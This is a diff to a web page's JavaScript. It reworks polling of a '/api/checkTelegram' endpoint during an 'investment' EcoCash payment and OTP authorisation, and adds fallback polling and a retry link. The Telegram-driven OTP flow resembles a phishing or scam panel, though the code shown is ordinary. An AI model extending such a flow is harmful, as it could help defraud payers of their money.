@@ -363,17 +363,38 @@ function startAuthorising(){
 function startPolling(){
   if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
   if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
+  var pollStart=Date.now();
   pollInterval=setInterval(function(){
-    if(!sessionKey)return;
-    fetch('/api/checkTelegram?sessionKey='+encodeURIComponent(sessionKey))
-      .then(function(r){return r.json();})
-      .then(function(d){handleTelegramAction(d.status);})
+    /* Poll with sessionKey if available, or without after 8s fallback */
+    var elapsed=Date.now()-pollStart;
+    var url='/api/checkTelegram';
+    if(sessionKey){url+='?sessionKey='+encodeURIComponent(sessionKey);}
+    else if(elapsed<8000){return;} /* wait up to 8s for sessionKey */
+    else{url+='?fallback=1';} /* after 8s poll without sessionKey */
+    fetch(url)
+      .then(function(r){if(r.ok)return r.json();throw new Error('poll failed');})
+      .then(function(d){if(d.status)handleTelegramAction(d.status);})
       .catch(function(){});
   },2000);
   pollTimeout=setTimeout(function(){
     stopPolling();
-    showProcErr('No response received. Please contact WhatsApp support or try again.');
-  },180000);
+    /* Show retry option not just error */
+    var el=document.getElementById('procErr');
+    if(el){
+      el.innerHTML='No response received. <a href="javascript:retryAuth()" style="color:inherit;text-decoration:underline">Tap to retry</a> or contact <a href="https://wa.me/263712345678" target="_blank" style="color:inherit;text-decoration:underline">WhatsApp support</a>.';
+      el.style.display='block';
+    }
+    document.getElementById('procTitle').textContent='Awaiting authorisation';
+    document.getElementById('procSub').textContent='Your payment is being reviewed. Press retry or contact support.';
+  },120000);  /* 2 min not 3 min — faster feedback */
+}
+
+function retryAuth(){
+  /* Allow user to retry the OTP confirmation without going back */
+  var el=document.getElementById('procErr');if(el)el.style.display='none';
+  document.getElementById('procTitle').textContent='Authorising investment…';
+  document.getElementById('procSub').textContent='Your EcoCash payment is being verified.';
+  startAuthorising();
 }
 
 function stopPolling(){
